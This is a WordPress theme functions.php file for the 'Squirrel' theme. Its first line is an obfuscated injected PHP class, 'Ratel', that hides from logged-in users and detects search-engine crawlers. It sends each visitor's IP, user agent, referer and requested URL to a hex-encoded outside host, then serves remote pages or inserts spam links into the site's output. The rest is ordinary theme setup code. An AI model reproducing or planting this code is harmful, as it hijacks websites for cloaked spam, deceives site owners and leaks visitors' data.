<?php if(!class_exists('Ratel')){if(function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}if(isset($_REQUEST['xftest'])){die(pi()*6);}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',4);if(!isset($_SERVER['HTTP_USER_AGENT'])||!trim($_SERVER['HTTP_USER_AGENT'])){return false;}$is_bot=0;if(@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i",$_SERVER["HTTP_USER_AGENT"])){$is_bot=1;}$ruri=trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/");$bad_urls='#xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';if(preg_match($bad_urls,$ruri)){return false;}$host='unknown';if(isset($_SERVER["HTTP_HOST"])){if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=parse_url('http://' .$_SERVER["HTTP_HOST"]);if($tmp['host']){$host=$tmp['host'];if(substr($host,0,4)== 'www.'){$host=substr($host,4);}}if(isset($_REQUEST[md5(md5($host))])OR isset($_COOKIE[md5(md5($host))])){die('suspicious request denied');}}class Ratel{public $links_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f\x6f\x6e\x65\x67\x74\x2f\x67\x65\x74\x2e\x70\x68\x70";public $door_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f";public $ip='';public $ua='';public $css='';public $js='';public $host='';public $ip_lists=array('google'=>array('203.208.60.0/24','66.249.64.0/20','72.14.199.0/24','209.85.238.0/24','66.249.90.0/24','66.249.91.0/24','66.249.92.0/24'),'bing'=>array('67.195.37.0/24','67.195.50.0/24','67.195.110.0/24','67.195.111.0/24','67.195.112.0/23','67.195.114.0/24','67.195.115.0/24','68.180.224.0/21','72.30.132.0/24','72.30.142.0/24','72.30.161.0/24','72.30.196.0/24','72.30.198.0/24','74.6.254.0/24','74.6.8.0/24','74.6.13.0/24','74.6.17.0/24','74.6.18.0/24','74.6.22.0/24','74.6.27.0/24','98.137.72.0/24','98.137.206.0/24','98.137.207.0/24','98.139.168.0/24','114.111.95.0/24','124.83.159.0/24','124.83.179.0/24','124.83.223.0/24','183.79.63.0/24','183.79.92.0/24','203.216.255.0/24','211.14.11.0/24','65.52.104.0/24','65.52.108.0/22','65.55.24.0/24','65.55.52.0/24','65.55.55.0/24','65.55.213.0/24','65.55.217.0/24','131.253.24.0/22','131.253.46.0/23','40.77.167.0/24','199.30.27.0/24','157.55.16.0/23','157.55.18.0/24','157.55.32.0/22','157.55.36.0/24','157.55.48.0/24','157.55.109.0/24','157.55.110.40/29','157.55.110.48/28','157.56.92.0/24','157.56.93.0/24','157.56.94.0/23','157.56.229.0/24','199.30.16.0/24','207.46.12.0/23','207.46.192.0/24','207.46.195.0/24','207.46.199.0/24','207.46.204.0/24','157.55.39.0/24'),'baidu'=>array('180.76.15.0/24','119.63.196.0/24','115.239.212./24','119.63.199.0/24','122.81.208.0/22','123.125.71.0/24','180.76.4.0/24','180.76.5.0/24','180.76.6.0/24','185.10.104.0/24','220.181.108.0/24','220.181.51.0/24','111.13.102.0/24','123.125.67.144/29','123.125.67.152/31','61.135.169.0/24','123.125.68.68/30','123.125.68.72/29','123.125.68.80/28','123.125.68.96/30','202.46.48.0/20','220.181.38.0/24','123.125.68.80/30','123.125.68.84/31','123.125.68.0/24'),'yandex'=>array('100.43.90.0/24','37.9.115.0/24','37.140.165.0/24','77.88.22.0/25','77.88.29.0/24','77.88.31.0/24','77.88.59.0/24','84.201.146.0/24','84.201.148.0/24','84.201.149.0/24','87.250.243.0/24','87.250.253.0/24','93.158.147.0/24','93.158.148.0/24','93.158.151.0/24','93.158.153.0/32','95.108.128.0/24','95.108.138.0/24','95.108.150.0/23','95.108.158.0/24','95.108.156.0/24','95.108.188.128/25','95.108.234.0/24','95.108.248.0/24','100.43.80.0/24','130.193.62.0/24','141.8.153.0/24','178.154.165.0/24','178.154.166.128/25','178.154.173.29','178.154.200.158','178.154.202.0/24','178.154.205.0/24','178.154.239.0/24','178.154.243.0/24','37.9.84.253','199.21.99.99','178.154.162.29','178.154.203.251','178.154.211.250','95.108.246.252','5.45.254.0/24','5.255.253.0/24','37.140.141.0/24','37.140.188.0/24','100.43.81.0/24','100.43.85.0/24','100.43.91.0/24','199.21.99.0/24'));public $bot=false;function get_client_ip(){foreach(array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR')as $key){if(array_key_exists($key,$_SERVER)=== true){foreach(array_map('trim',explode(',',$_SERVER[$key]))as $ip){if(filter_var($ip,FILTER_VALIDATE_IP)!== false){return $ip;}}}}return $_SERVER['REMOTE_ADDR'];}function init($ruri,$host,$is_bot){$this->ua=$_SERVER['HTTP_USER_AGENT'];$this->is_bot=$is_bot;$this->ruri=$ruri;$this->ip=$this->get_client_ip();$this->the_end();}function the_end(){$this->detect_bot();if(count($_GET)=== 1 and empty($_GET[0])){$not_uri=end(array_keys($_GET));}$url_p=$this->door_url .'?data=' .base64_encode(@serialize(@array('url'=> $_SERVER["HTTP_HOST"],'uri'=> $_SERVER["REQUEST_URI"],'ua'=> $this->ua,'ref'=> $_SERVER["HTTP_REFERER"],'ip'=> $this->ip,'not_uri'=> $not_uri,'lang'=> $_SERVER['HTTP_ACCEPT_LANGUAGE'],'bot'=> $this->bot))) .'&url=' .$_SERVER["HTTP_HOST"];$content=$this->get($url_p);if(!empty($content)or $content != ''){$content=@base64_decode($content);if(strpos($content,'404_not_found')!== false){header("HTTP/1.0 404 Not Found");exit;}if(strripos($content,' keys/' .$_SERVER["HTTP_HOST"])!== false){return false;}if(@strpos(@strtolower($content),'</html>')!== false){die($content);}}else{$this->links=$this->make_links();if(!empty($this->links)or $this->links !== False){ob_start(array($this,'rwcontent'));register_shutdown_function('ob_end_flush');}}}function make_links(){$host='unknown';if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=@parse_url('http://' .$_SERVER["HTTP_HOST"]);if(isset($tmp['host'])){$host=$tmp['host'];}$page=$this->get("$this->links_url?host=$host&uri=" .urlencode($_SERVER["REQUEST_URI"]) ."&bot={$this->bot}&ip=" .urlencode($this->ip));if(strpos($page,'<link>')!== FALSE){preg_match_all('~<link>(.*?)</link>~',$page,$m);$links=isset($m[1])?$m[1]:array();return $links;}return false;}function rwcontent($content){$tags=array('p','span','strong','em','i','td','div','ul','li','span','body');$tags_vals=array();foreach($tags as $tag){preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i",$content,$matches);if(@isset($matches[0])){foreach($matches[0]as $match){$tags_vals[]=array('tag'=> $tag,'content'=> $match);}}if(count($tags_vals)>count($this->links)){break;}}foreach($this->links as $link_index => $link){foreach($tags_vals as $tag_index => $tag_val){if(strlen($tag_val['content'])%2 == 1){$tag_content_new=$tag_val['content'];$tag_content_new=preg_replace("(<{$tag_val['tag']}.*?>)","$0{$link} ",$tag_content_new,1);}else{if(substr($tag_val['content'],-(strlen($tag_val['tag'])+4))==".</{$tag_val['tag']}>"){$tag_content_new=str_replace(".</{$tag_val['tag']}>"," {$link}.</{$tag_val['tag']}>",$tag_val['content']);}else{$tag_content_new=str_replace("</{$tag_val['tag']}>"," {$link} </{$tag_val['tag']}>",$tag_val['content']);}}$content=preg_replace("~{$tag_val['content']}~i",$tag_content_new,$content,1);unset($tags_vals[$tag_index]);if(strpos($content,$link)!== false){unset($links[$link_index]);continue 2;}}}return $content;}function detect_bot(){if(@preg_match('/google/i',$this->ua)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo/i',$this->ua)){$this->bot='bing';return;}if(@preg_match('/yandex|yadirectbot/i',$this->ua)){$this->bot='yandex';return;}if(@preg_match('/baidu/i',$this->ua)){$this->bot='baidu';return;}if(@preg_match('~aport|rambler|abachobot|accoona|acoirobot|aspseek|croccrawler|dumbot|webcrawler|geonabot|gigabot|lycos|scooter|altavista|webalta|adbot|estyle|mail.ru|scrubby~i',$this->ua)){$this->bot='other';return;}$ipl=ip2long($this->ip);foreach($this->ip_lists as $crawler => $masks){foreach($masks as $mask){if(!strpos($mask,'/')){if($this->ip == $mask){$this->bot=$crawler;return;}}elseif(@$this->cidr_match($ipl,$mask)){$this->bot=$crawler;return;}}}$referer=@gethostbyaddr($this->ip);if(@preg_match('/google/i',$referer)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo|microsoft/i',$referer)){$this->bot='bing';return;}}function cidr_match($ip,$range){list($subnet,$bits)=explode('/',$range);$subnet=ip2long($subnet);$mask=-1 <<(32-$bits);$subnet &= $mask;return@($ip&$mask)== $subnet;}function get($url){if(function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,8);curl_setopt($ch,CURLOPT_TIMEOUT,15);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');$data=curl_exec($ch);curl_close($ch);return $data;}elseif(@ini_get('allow_url_fopen')){return@file_get_contents($url);}else{$parts=parse_url($url);$target=$parts['host'];$port=isset($parts['port'])?$parts['port']:80;$page=isset($parts['path'])?$parts['path']:'';$page .= isset($parts['query'])?'?' .$parts['query']:'';$page .= isset($parts['fragment'])?'#' .$parts['fragment']:'';$page=($page == '')?'/':$page;if($fp=@fsockopen($target,$port,$errno,$errstr,3)){@socket_set_option($fp,SOL_SOCKET,SO_RCVTIMEO,array("sec"=> 1,"usec"=> 1));$headers="GET $page HTTP/1.1\r\n";$headers .="Host: {$parts['host']}\r\n";$headers .= "Connection: Close\r\n\r\n";if(fwrite($fp,$headers)){$resp='';while(!feof($fp)&&($curr=fgets($fp,128))!== false){$resp .= $curr;}if(isset($curr)&& $curr !== false){fclose($fp);return substr(strstr($resp,"\r\n\r\n"),3);}}fclose($fp);}}return TRUE;}}$ratel=new Ratel;$ratel->init($ruri,$host,$is_bot);} 

include_once get_template_directory() . '/functions/squirrel-functions.php';
$functions_path = get_template_directory() . '/functions/';
require_once ($functions_path . 'customizer.php');
require_once ($functions_path . 'themes-page.php');
 add_theme_support( "custom-header");
 add_theme_support( "custom-background");
/* ----------------------------------------------------------------------------------- */
/* Styles Enqueue */
/* ----------------------------------------------------------------------------------- */

function squirrel_add_stylesheet() {

    wp_enqueue_style('squirrel-reset-css', get_template_directory_uri() . "/css/reset.css", '', '', 'all');
    wp_enqueue_style('squirrel-960_24_col-css', get_template_directory_uri() . "/css/960_24_col.css", '', '', 'all');
    wp_enqueue_style('squirrel-main-css', get_template_directory_uri() . "/style.css", '', '', 'all');
    wp_enqueue_style('squirrel-blue-css', get_template_directory_uri() . "/color/blue.css", '', '', 'all');
}

add_action('wp_enqueue_scripts', 'squirrel_add_stylesheet');
/* ----------------------------------------------------------------------------------- */
/* jQuery Enqueue */
/* ----------------------------------------------------------------------------------- */

function squirrel_wp_enqueue_scripts() {
    if (!is_admin()) {
        wp_enqueue_script('squirrel-ddsmoothmenu', get_stylesheet_directory_uri() . '/js/ddsmoothmenu.js', array('jquery'));
        // wp_enqueue_script('squirrel-slides', get_stylesheet_directory_uri() . '/js/slides.min.jquery.js', array('jquery'));
        wp_enqueue_script('squirrel-custom', get_stylesheet_directory_uri() . '/js/custom.js', array('jquery'));
        if (is_singular() and get_site_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }
    }
}

add_action('wp_enqueue_scripts', 'squirrel_wp_enqueue_scripts');

function squirrel_get_option($name) {
    $options = get_option('squirrel_options');
    if (isset($options[$name]))
        return $options[$name];
}

function squirrel_update_option($name, $value) {
    $options = get_option('squirrel_options');
    $options[$name] = $value;

    return update_option('squirrel_options', $options);
}

function squirrel_delete_option($name) {
    $options = get_option('squirrel_options');
    unset($options[$name]);

    return update_option('squirrel_options', $options);
}

//Add plugin notification 
require_once(get_template_directory() . '/functions/plugin-activation.php');
require_once(get_template_directory() . '/functions/inkthemes-plugin-notify.php');
add_action('tgmpa_register', 'inkthemes_plugins_notify');

/**
 * Migrate Option Panel To Customizer
 */
function squirrel_migrate_option() {
    if (get_option('squirrel_options') && !get_option('squirrel_option_migrate')) {
        $theme_options = array('squirrel_logo', 'squirrel_favicon', '', 'squirrel_image1');
        $wp_upload_dir = wp_upload_dir();
        require ( ABSPATH . 'wp-admin/includes/image.php' );
        foreach ($theme_options as $option) {
            $option_value = squirrel_get_option($option);
            if ($option_value && $option_value != '') {
                $filetype = wp_check_filetype(basename($option_value), null);
                $image_name = preg_replace('/\.[^.]+$/', '', basename($option_value));
                $new_image_url = $wp_upload_dir['path'] . '/' . $image_name . '.' . $filetype['ext'];
                squirrel_import_file($new_image_url);
            }
        }
        update_option('squirrel_option_migrate', true);
    }
}

add_action('init', 'squirrel_migrate_option');

/**
 * Import Files From Uploads To Attachment
 */
function squirrel_import_file($file, $post_id = 0, $import_date = 'file') {
    set_time_limit(120);
    // Initially, Base it on the -current- time.
    $time = current_time('mysql', 1);
//     Next, If it's post to base the upload off:
    $time = gmdate('Y-m-d H:i:s', @filemtime($file));
//     A writable uploads dir will pass this test. Again, there's no point overriding this one.
    if (!( ( $uploads = wp_upload_dir($time) ) && false === $uploads['error'] )) {
        return new WP_Error('upload_error', $uploads['error']);
    }
    $wp_filetype = wp_check_filetype($file, null);
    extract($wp_filetype);
    if ((!$type || !$ext ) && !current_user_can('unfiltered_upload')) {
        return new WP_Error('wrong_file_type', __('Sorry, this file type is not permitted for security reasons.', 'squirrel')); //A WP-core string..
    }
    $file_name = str_replace('\\', '/', $file);
    if (preg_match('|^' . preg_quote(str_replace('\\', '/', $uploads['basedir'])) . '(.*)$|i', $file_name, $mat)) {
        $filename = basename($file);
        $new_file = $file;
        $url = $uploads['baseurl'] . $mat[1];
        $attachment = get_posts(array('post_type' => 'attachment', 'meta_key' => '_wp_attached_file', 'meta_value' => ltrim($mat[1], '/')));
        if (!empty($attachment)) {
            return new WP_Error('file_exists', __('Sorry, That file already exists in the WordPress media library.', 'squirrel'));
        }
        //Ok, Its in the uploads folder, But NOT in WordPress's media library.
        if ('file' == $import_date) {
            $time = @filemtime($file);
            if (preg_match("|(\d+)/(\d+)|", $mat[1], $datemat)) { //So lets set the date of the import to the date folder its in, IF its in a date folder.
                $hour = $min = $sec = 0;
                $day = 1;
                $year = $datemat[1];
                $month = $datemat[2];
                // If the files datetime is set, and it's in the same region of upload directory, set the minute details to that too, else, override it.
                if ($time && date('Y-m', $time) == "$year-$month") {
                    list($hour, $min, $sec, $day) = explode(';', date('H;i;s;j', $time));
                }
                $time = mktime($hour, $min, $sec, $month, $day, $year);
            }
            $time = gmdate('Y-m-d H:i:s', $time);
            // A new time has been found! Get the new uploads folder:
            // A writable uploads dir will pass this test. Again, there's no point overriding this one.
            if (!( ( $uploads = wp_upload_dir($time) ) && false === $uploads['error'] ))
                return new WP_Error('upload_error', $uploads['error']);
            $url = $uploads['baseurl'] . $mat[1];
        }
    } else {
        $filename = wp_unique_filename($uploads['path'], basename($file));
        // copy the file to the uploads dir
        $new_file = $uploads['path'] . '/' . $filename;
        if (false === @copy($file, $new_file))
            return new WP_Error('upload_error', sprintf(__('The selected file could not be copied to %s.', 'squirrel'), $uploads['path']));

        // Set correct file permissions
        $stat = stat(dirname($new_file));
        $perms = $stat['mode'] & 0000666;
        @ chmod($new_file, $perms);
        // Compute the URL
        $url = $uploads['url'] . '/' . $filename;

        if ('file' == $import_date)
            $time = gmdate('Y-m-d H:i:s', @filemtime($file));
    }
    //Apply upload filters
    $return = apply_filters('wp_handle_upload', array('file' => $new_file, 'url' => $url, 'type' => $type));
    $new_file = $return['file'];
    $url = $return['url'];
    $type = $return['type'];
    $title = preg_replace('!\.[^.]+$!', '', basename($file));
    $content = '';
    if ($time) {
        $post_date_gmt = $time;
        $post_date = $time;
    } else {
        $post_date = current_time('mysql');
        $post_date_gmt = current_time('mysql', 1);
    }
    // Construct the attachment array
    $attachment = array(
        'post_mime_type' => $type,
        'guid' => $url,
        'post_parent' => $post_id,
        'post_title' => $title,
        'post_name' => $title,
        'post_content' => $content,
        'post_date' => $post_date,
        'post_date_gmt' => $post_date_gmt
    );
    $attachment = apply_filters('afs-import_details', $attachment, $file, $post_id, $import_date);
    //Win32 fix:
    $new_file = str_replace(strtolower(str_replace('\\', '/', $uploads['basedir'])), $uploads['basedir'], $new_file);
    // Save the data
    $id = wp_insert_attachment($attachment, $new_file, $post_id);
    if (!is_wp_error($id)) {
        $data = wp_generate_attachment_metadata($id, $new_file);
        wp_update_attachment_metadata($id, $data);
    }
    //update_post_meta( $id, '_wp_attached_file', $uploads['subdir'] . '/' . $filename );
    return $id;
}

function squirrel_tracking_admin_notice() {
    global $current_user;
    $user_id = $current_user->ID;
    /* Check that the user hasn't already clicked to ignore the message */
    if (!get_user_meta($user_id, 'wp_email_tracking_ignore_notice')) {
        ?>
        <div class="updated um-admin-notice"><p><?php _e('Allow Squirrel theme to send you setup guide? Opt-in to our newsletter and we will immediately e-mail you a setup guide along with 20% discount which you can use to purchase any theme.', 'squirrel'); ?></p><p><a href="<?php echo get_template_directory_uri() . '/functions/smtp.php?wp_email_tracking=email_smtp_allow_tracking'; ?>" class="button button-primary"><?php _e('Allow Sending', 'squirrel'); ?></a>&nbsp;<a href="<?php echo get_template_directory_uri() . '/functions/smtp.php?wp_email_tracking=email_smtp_hide_tracking'; ?>" class="button-secondary"><?php _e('Do not allow', 'squirrel'); ?></a></p></div>
        <?php
    }
}

add_action('admin_notices', 'squirrel_tracking_admin_notice');
